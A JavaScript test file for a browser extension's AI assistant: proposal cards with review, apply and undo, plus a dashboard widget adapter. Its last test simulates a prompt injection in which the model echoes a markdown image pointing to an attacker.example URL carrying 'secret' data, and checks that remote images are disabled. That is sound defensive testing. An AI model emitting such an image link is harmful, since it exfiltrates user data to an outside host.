// Proposal cards end to end against a fake engine (Review exclusions sent to the engine, receipts, live and saved Undo),
// and the assistant's dashboard adapter against a real dashboard store and the real links-folder widget definition.
import test from 'node:test';
import assert from 'node:assert/strict';
import { aiState, renderProposalCard } from '../extension/ui/ai-panel.js';
import { dispatch } from '../extension/ui/runtime.js';
import { createDashboardStore, getDashboard, DASHBOARD_KEY } from '../extension/lib/dashboard-store.js';
import { createAssistantDashboard, LINKS_WIDGET } from '../extension/ui/dashboard/assistant-adapter.js';
import { getWidget, clampSize } from '../extension/ui/dashboard/registry.js';
import { collides } from '../extension/ui/dashboard/grid.js';
import { assistantDashboard } from '../extension/ui/dashboard/index.js';
import '../extension/ui/widgets/index.js';

const flat = fragment => String(fragment).replace(/\s+/g, ' ');
const plainText = fragment => String(fragment).replace(/<[^>]+>/g, '').replace(/\s+/g, ' ').trim();
const ticks = async (until, max = 200) => { for (let i = 0; i < max && !until(); i++) await new Promise(resolve => setImmediate(resolve)); assert.ok(until(), 'timed out'); };

function fakeCtx({ conversation = null, undoProposal } = {}) {
  const calls = { bulk: [], saved: [], undoProposal: [] };
  const ctx = {
    state: { view: 'assistant', panel: null, selection: new Set(), popover: null, dialogs: [], shell: { docked: true }, assistant: { layout: 'wide', sheet: null, query: '' } },
    env: { isSidepanel: false, isNewtab: false, isExtension: false, isMac: false, modKey: 'Ctrl' },
    prefs: { get: (key, fallback) => fallback, set() {} },
    library: { items: [], collections: [], settings: {} },
    select: { byId: () => null, live: () => [], path: () => [], collection: () => null, recentCollections: () => [], tree: () => [], descendants: id => [id] },
    store: { bulkUpdateItems: async (...args) => { calls.bulk.push(args); } },
    ai: {
      listConversations: async () => [],
      saveConversation: async value => { calls.saved.push(structuredClone(value)); return value; },
      getConversation: async () => null,
      ...(undoProposal === false ? {} : { undoProposal: undoProposal || (async undo => { calls.undoProposal.push(undo); }) }),
    },
    render() {}, renderNow() {}, nextFrame() {}, toast() {}, syncUrl() {},
  };
  const s = aiState(ctx);
  s.target = { providerName: 'Anthropic', model: 'claude-sonnet-5-5', modelLabel: 'Claude Sonnet 5.5', via: 'direct', efforts: [] };
  s.conversation = conversation;
  s.history = [];
  return { ctx, calls };
}

function linksProposal(id) {
  return {
    id, title: '2 changes', summary: 'Create collection API Consoles. Save 3 links to API Consoles.',
    changes: [
      { op: 'create_collection', label: 'Create collection API Consoles', itemIds: [], count: 0, collectionId: 'collection_api', collectionName: 'API Consoles' },
      { op: 'save_links', label: 'Save 3 links to API Consoles', itemIds: ['item_aws', 'item_azure', 'item_gcp'], count: 3, collectionId: 'collection_api', collectionName: 'API Consoles',
        items: [{ id: 'item_aws', title: 'AWS', url: 'https://console.aws.amazon.com/' }, { id: 'item_azure', title: 'Azure', url: 'https://portal.azure.com/#home' },
          { id: 'item_gcp', title: 'GCP', url: 'https://console.cloud.google.com/' }] },
    ],
  };
}

// The engine side of one turn: shows the card, waits for the decision, reports the result like lib/ai/tools.js does.
function fakeRun(ctx, proposal, seen) {
  ctx.ai.runAssistant = async ({ onEvent, onProposal, conversationId }) => {
    onEvent({ type: 'proposal', proposal });
    const decision = await onProposal(proposal);
    seen.decision = decision;
    const apply = decision === 'apply' || decision?.decision === 'apply';
    const excluded = apply && Array.isArray(decision?.exclude) ? decision.exclude : [];
    const saving = proposal.changes.find(change => change.op === 'save_links')?.itemIds || [];
    const undo = { patches: [], createdCollections: ['collection_api'], createdItems: saving.filter(id => !excluded.includes(id)) };
    onEvent(apply ? { type: 'proposal_result', proposalId: proposal.id, status: 'applied', summary: proposal.summary, excluded, undo: async () => { seen.liveUndo = (seen.liveUndo || 0) + 1; } }
      : { type: 'proposal_result', proposalId: proposal.id, status: 'discarded' });
    const record = { ...proposal, status: apply ? 'applied' : 'discarded', ...(apply ? { excluded, undo } : {}) };
    const message = { id: `msg_${proposal.id}`, role: 'assistant', text: 'Done.', proposals: [record], tools: [], citations: [] };
    return { conversation: { id: conversationId, title: 'Links', messages: [{ id: `q_${proposal.id}`, role: 'user', text: 'Save these links' }, message] }, message };
  };
}

const pendingCard = (ctx, id) => aiState(ctx).run?.message.proposals.find(entry => entry.id === id);
const savedProposal = (ctx, id) => aiState(ctx).conversation?.messages.flatMap(message => message.proposals || []).find(entry => entry.id === id);

test('Review exclusions go to the engine with Apply, and the receipt counts what was applied', async () => {
  globalThis.document ??= { getElementById: () => null };
  const { ctx, calls } = fakeCtx();
  const seen = {};
  fakeRun(ctx, linksProposal('proposal_links'), seen);
  aiState(ctx).draft = 'Create a collection API Consoles with these links';
  await dispatch('ai.send', { ctx });
  await ticks(() => pendingCard(ctx, 'proposal_links'));

  await dispatch('ai.proposal-review', { ctx, data: { id: 'proposal_links' } });
  let card = flat(renderProposalCard(ctx, pendingCard(ctx, 'proposal_links')));
  assert.equal((card.match(/data-change="ai.review-item"/g) || []).length, 3, 'links still to be saved can be reviewed');
  assert.match(card, /3 of 3 links selected/);
  assert.match(card, /title="https:\/\/portal\.azure\.com\/#home">portal\.azure\.com</, 'the full address is one hover away');

  await dispatch('ai.review-item', { ctx, el: { checked: false }, data: { proposal: 'proposal_links', changeIndex: '1', item: 'item_azure' } });
  card = flat(renderProposalCard(ctx, pendingCard(ctx, 'proposal_links')));
  assert.match(plainText(card), /Save 2 links to API Consoles/);
  assert.match(card, /2 of 3 links selected/);
  assert.match(card, /Apply 2 changes/);

  await dispatch('ai.proposal-apply', { ctx, data: { id: 'proposal_links' } });
  await ticks(() => !aiState(ctx).run);
  assert.deepEqual(seen.decision, { decision: 'apply', exclude: ['item_azure'] }, 'the engine learns which items to leave out');
  assert.deepEqual(calls.bulk, [], 'nothing is patched back after the engine applies');

  const saved = savedProposal(ctx, 'proposal_links');
  assert.deepEqual(saved.appliedLines, ['Created collection API Consoles', 'Saved 2 links to API Consoles'], 'the receipt lines are saved with the chat');
  const receipt = flat(renderProposalCard(ctx, saved));
  assert.match(receipt, /data-status="applied"/);
  assert.match(receipt, /Applied 2 changes/);
  assert.match(receipt, /Saved 2 links to API Consoles/);
  assert.match(receipt, /data-action="ai.proposal-undo"/);

  // The live undo from this run wins over the saved record.
  await dispatch('ai.proposal-undo', { ctx, data: { id: 'proposal_links' } });
  assert.equal(seen.liveUndo, 1);
  assert.deepEqual(calls.undoProposal, []);
  assert.equal(savedProposal(ctx, 'proposal_links').status, 'undone');
  assert.equal(calls.saved.at(-1).messages[1].proposals[0].status, 'undone', 'the undone status is saved');
  assert.match(flat(renderProposalCard(ctx, savedProposal(ctx, 'proposal_links'))), /Undone\. Your library is back as it was\./);
  await dispatch('ai.proposal-undo', { ctx, data: { id: 'proposal_links' } });
  assert.equal(seen.liveUndo, 1, 'undo runs once');
});

test('Apply without exclusions answers a plain apply; unchecking everything discards', async () => {
  globalThis.document ??= { getElementById: () => null };
  const plain = fakeCtx();
  const seen = {};
  fakeRun(plain.ctx, linksProposal('proposal_plain'), seen);
  aiState(plain.ctx).draft = 'Save these';
  await dispatch('ai.send', { ctx: plain.ctx });
  await ticks(() => pendingCard(plain.ctx, 'proposal_plain'));
  await dispatch('ai.proposal-apply', { ctx: plain.ctx, data: { id: 'proposal_plain' } });
  await ticks(() => !aiState(plain.ctx).run);
  assert.equal(seen.decision, 'apply');
  assert.match(flat(renderProposalCard(plain.ctx, savedProposal(plain.ctx, 'proposal_plain'))), /Saved 3 links to API Consoles/);

  const none = fakeCtx();
  const declined = {};
  const proposal = { id: 'proposal_none', changes: [linksProposal('x').changes[1]] };
  fakeRun(none.ctx, { ...proposal, changes: [{ ...proposal.changes[0] }] }, declined);
  aiState(none.ctx).draft = 'Save these';
  await dispatch('ai.send', { ctx: none.ctx });
  await ticks(() => pendingCard(none.ctx, 'proposal_none'));
  await dispatch('ai.review-all', { ctx: none.ctx, el: { checked: false }, data: { proposal: 'proposal_none', changeIndex: '0' } });
  assert.match(flat(renderProposalCard(none.ctx, pendingCard(none.ctx, 'proposal_none'))), /data-action="ai.proposal-apply"[^>]*disabled/, 'nothing left to apply');
  await dispatch('ai.review-all', { ctx: none.ctx, el: { checked: true }, data: { proposal: 'proposal_none', changeIndex: '0' } });
  await dispatch('ai.review-all', { ctx: none.ctx, el: { checked: false }, data: { proposal: 'proposal_none', changeIndex: '0' } });
  await dispatch('ai.proposal-apply', { ctx: none.ctx, data: { id: 'proposal_none' } });
  await ticks(() => !aiState(none.ctx).run);
  assert.equal(declined.decision, 'discard');
});

test('after a reload, Undo reverts an applied proposal from its saved undo record', async () => {
  const undo = { patches: [{ id: 'note_a', patch: { type: 'note' } }], createdCollections: ['collection_api'], createdItems: ['item_aws'], widgets: ['w_links'] };
  const proposal = { ...linksProposal('proposal_saved'), status: 'applied', undo, appliedLines: ['Created collection API Consoles', 'Saved 3 links to API Consoles'] };
  const conversation = { id: 'conversation_saved', title: 'Links', messages: [{ id: 'q', role: 'user', text: 'Save' }, { id: 'a', role: 'assistant', text: 'Done.', proposals: [proposal] }] };
  const { ctx, calls } = fakeCtx({ conversation: structuredClone(conversation) });
  assert.match(flat(renderProposalCard(ctx, savedProposal(ctx, 'proposal_saved'))), /data-action="ai.proposal-undo"/, 'Undo is offered without the live run');

  await dispatch('ai.proposal-undo', { ctx, data: { id: 'proposal_saved' } });
  assert.deepEqual(calls.undoProposal, [undo], 'the saved record goes to ai.undoProposal');
  assert.equal(savedProposal(ctx, 'proposal_saved').status, 'undone');
  assert.equal(calls.saved.at(-1).messages[1].proposals[0].status, 'undone');
  assert.match(flat(renderProposalCard(ctx, savedProposal(ctx, 'proposal_saved'))), /Undone\./);
  await dispatch('ai.proposal-undo', { ctx, data: { id: 'proposal_saved' } });
  assert.equal(calls.undoProposal.length, 1, 'undo runs once');

  // An engine without undoProposal, a proposal without a record, or one already undone elsewhere: no Undo button.
  const old = fakeCtx({ conversation: structuredClone({ ...conversation, messages: [conversation.messages[0], { ...conversation.messages[1], proposals: [{ ...proposal, id: 'proposal_old' }] }] }), undoProposal: false });
  assert.doesNotMatch(flat(renderProposalCard(old.ctx, savedProposal(old.ctx, 'proposal_old'))), /ai.proposal-undo/);
  const bare = fakeCtx();
  assert.doesNotMatch(flat(renderProposalCard(bare.ctx, { ...proposal, id: 'proposal_bare', undo: undefined })), /ai.proposal-undo/);
  assert.match(flat(renderProposalCard(bare.ctx, { ...proposal, id: 'proposal_elsewhere', status: 'undone' })), /data-status="undone"/);
});

test('a proposal undone in another window is not undone again here', async () => {
  globalThis.document ??= { getElementById: () => null };
  const { ctx } = fakeCtx();
  const seen = {};
  fakeRun(ctx, linksProposal('proposal_twice'), seen);
  aiState(ctx).draft = 'Save these';
  await dispatch('ai.send', { ctx });
  await ticks(() => pendingCard(ctx, 'proposal_twice'));
  await dispatch('ai.proposal-apply', { ctx, data: { id: 'proposal_twice' } });
  await ticks(() => !aiState(ctx).run);
  // The other window saved the conversation with the proposal undone; this view follows it (followConversation).
  const s = aiState(ctx);
  s.conversation = { ...s.conversation, messages: s.conversation.messages.map(message => ({ ...message, proposals: (message.proposals || []).map(entry => ({ ...entry, status: 'undone' })) })) };
  assert.match(flat(renderProposalCard(ctx, savedProposal(ctx, 'proposal_twice'))), /data-status="undone"/);
  await dispatch('ai.proposal-undo', { ctx, data: { id: 'proposal_twice' } });
  assert.equal(seen.liveUndo, undefined);
});

// ------------------------------------------------------------------------------------------------ dashboard adapter

function memoryDashboard(initial) {
  let stored = structuredClone(initial);
  let writes = 0;
  const store = createDashboardStore({ read: async () => structuredClone(stored), write: async value => { stored = structuredClone(value); writes++; } });
  return { store, stored: () => stored, writes: () => writes };
}

const initialDashboard = () => ({
  version: 1, activeBoardId: 'board_main', prefs: {}, updatedAt: '2026-10-01T00:00:00.000Z',
  boards: [
    { id: 'board_main', name: 'Main', icon: 'layout-dashboard', widgets: [
      { id: 'w_clock', type: 'clock', x: 0, y: 0, w: 4, h: 2, title: '', style: { frame: 'default', hideTitle: false }, config: {} },
      { id: 'w_old', type: LINKS_WIDGET, x: 4, y: 0, w: 4, h: 3, title: '', style: { frame: 'default', hideTitle: false }, config: { collectionId: 'collection_old', includeSubcollections: true } },
      { id: 'w_notes', type: 'notes', x: 8, y: 0, w: 4, h: 3, title: 'Notes', style: { frame: 'default', hideTitle: false }, config: { collectionId: '*' } },
    ] },
    { id: 'board_work', name: 'Work', icon: 'briefcase', widgets: [] },
  ],
});

test('the dashboard adapter loads first, describes boards, and adds and removes a links widget for a collection', async () => {
  const { store, stored, writes } = memoryDashboard(initialDashboard());
  let readies = 0;
  const adapter = createAssistantDashboard({ ready: async () => { readies++; await store.load(); }, store, getWidget, clampSize });
  assert.equal(store.get(), null, 'nothing is loaded before the engine asks');

  const described = await adapter.describe();
  assert.equal(readies, 1, 'describe waits for the dashboard to load');
  assert.equal(described.activeBoardId, 'board_main');
  assert.deepEqual(described.boards.map(board => [board.id, board.name, board.widgets.length]), [['board_main', 'Main', 3], ['board_work', 'Work', 0]]);
  assert.deepEqual(described.boards[0].widgets[1], { id: 'w_old', type: LINKS_WIDGET, title: 'Collection', collectionId: 'collection_old', includeSubcollections: true });
  assert.equal(described.boards[0].widgets[2].collectionId, undefined, 'only collection widgets name the collection they show');
  assert.equal(described.boards[0].widgets[2].title, 'Notes');

  const added = await adapter.addCollectionWidget({ collectionId: 'collection_api' });
  assert.equal(added.boardId, 'board_main', 'the active board by default');
  const board = stored().boards.find(entry => entry.id === 'board_main');
  const widget = board.widgets.find(entry => entry.id === added.widgetId);
  const def = getWidget(LINKS_WIDGET);
  assert.equal(widget.type, LINKS_WIDGET);
  assert.deepEqual(widget.config, { ...def.defaults(), collectionId: 'collection_api' }, 'definition defaults with the collection filled in');
  assert.deepEqual({ w: widget.w, h: widget.h }, clampSize(def, def.size));
  assert.ok(board.widgets.filter(entry => entry.id !== widget.id).every(entry => !collides(entry, widget)), 'placed in a free spot');

  const onWork = await adapter.addCollectionWidget({ collectionId: 'collection_api', boardId: 'board_work' });
  assert.equal(onWork.boardId, 'board_work');
  assert.equal(stored().boards[1].widgets[0].config.collectionId, 'collection_api');

  await assert.rejects(adapter.addCollectionWidget({ collectionId: '' }), /Inbox/);
  await assert.rejects(adapter.addCollectionWidget({ collectionId: 'inbox' }), /Inbox/);
  await assert.rejects(adapter.addCollectionWidget({ collectionId: 'collection_api', boardId: 'board_gone' }), /no longer exists/);

  const before = writes();
  await adapter.removeWidget(added.widgetId);
  assert.ok(!stored().boards[0].widgets.some(entry => entry.id === added.widgetId), 'Undo removes the widget');
  await adapter.removeWidget(added.widgetId);
  await adapter.removeWidget('');
  assert.equal(writes(), before + 1, 'removing a widget that is already gone writes nothing');
  assert.equal(stored().boards[0].widgets.length, 3, 'the other widgets stay');
});

test('the dashboard adapter refuses to write when the dashboard could not be opened', async () => {
  let added = 0;
  const adapter = createAssistantDashboard({ store: { get: () => null, addWidget: async () => { added++; }, findWidget: () => null, removeWidget: async () => {} }, getWidget, clampSize });
  await assert.rejects(adapter.describe(), /could not be opened/);
  await assert.rejects(adapter.addCollectionWidget({ collectionId: 'collection_api' }), /could not be opened/);
  assert.equal(added, 0);
});

test('assistantDashboard() preloads the stored dashboard before it reads or writes (the side panel never preloads)', async () => {
  const data = { [DASHBOARD_KEY]: initialDashboard() };
  const listeners = [];
  const previous = globalThis.chrome;
  globalThis.chrome = { storage: {
    local: {
      async get(keys) {
        const list = keys == null ? Object.keys(data) : Array.isArray(keys) ? keys : typeof keys === 'string' ? [keys] : Object.keys(keys);
        return Object.fromEntries(list.filter(key => key in data).map(key => [key, structuredClone(data[key])]));
      },
      async set(values) { Object.assign(data, structuredClone(values)); },
      async remove(keys) { for (const key of [].concat(keys)) delete data[key]; },
    },
    onChanged: { addListener: fn => listeners.push(fn), removeListener() {} },
  } };
  try {
    assert.equal(getDashboard(), null, 'this view has not loaded the dashboard');
    const adapter = assistantDashboard();
    assert.equal(getDashboard(), null, 'creating the adapter loads nothing');
    const described = await adapter.describe();
    assert.equal(described.boards[0].widgets.length, 3, 'the stored dashboard, not an empty seed');
    assert.ok(getDashboard(), 'loaded through preload()');
    const { widgetId, boardId } = await adapter.addCollectionWidget({ collectionId: 'collection_api' });
    assert.equal(boardId, 'board_main');
    const saved = data[DASHBOARD_KEY].boards[0].widgets;
    assert.equal(saved.length, 4, 'the existing widgets are kept');
    assert.equal(saved.find(entry => entry.id === widgetId).config.collectionId, 'collection_api');
    await adapter.removeWidget(widgetId);
    assert.equal(data[DASHBOARD_KEY].boards[0].widgets.length, 3);
  } finally {
    if (previous === undefined) delete globalThis.chrome; else globalThis.chrome = previous;
  }
});

test('while an answer streams, a tool that read thread text turns remote images off at once', async () => {
  globalThis.document ??= { getElementById: () => null };
  const { ctx } = fakeCtx();
  let finish;
  ctx.ai.runAssistant = async ({ onEvent, conversationId }) => {
    // get_items read a chat (lib/ai/tools.js flags the tool event); the model then echoes an injected image.
    onEvent({ type: 'tool', id: 't1', name: 'get_items', summary: 'Read 1 item', result: { count: 1 }, usedThreads: true });
    onEvent({ type: 'text', delta: 'Here: ![x](https://attacker.example/?d=secret) done' });
    await new Promise(resolve => { finish = resolve; });
    const message = { id: 'msg_a', role: 'assistant', text: 'Here.', proposals: [], tools: [], citations: [], usedThreads: true };
    return { conversation: { id: conversationId, title: 'Q', messages: [{ id: 'q', role: 'user', text: 'Q' }, message] }, message };
  };
  aiState(ctx).draft = 'What does my chat say?';
  const sending = dispatch('ai.send', { ctx });
  await ticks(() => aiState(ctx).run?.message.text.includes('attacker'));
  // renderAnswer renders the live text with renderMd(..., { images: !message.usedThreads }).
  assert.equal(aiState(ctx).run.message.usedThreads, true, 'the streaming answer renders without images');
  finish();
  await sending;
});
